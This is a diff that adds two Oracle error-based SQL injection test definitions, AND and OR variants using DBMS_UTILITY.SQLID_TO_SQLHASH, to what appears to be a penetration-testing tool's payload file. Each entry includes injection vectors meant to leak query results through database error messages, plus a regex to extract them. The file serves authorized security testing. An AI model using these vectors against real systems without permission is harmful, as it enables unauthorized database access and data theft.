@@ -507,6 +507,44 @@
     </test>
 
     <test>
+        <title>Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>Firebird AND error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>3</level>
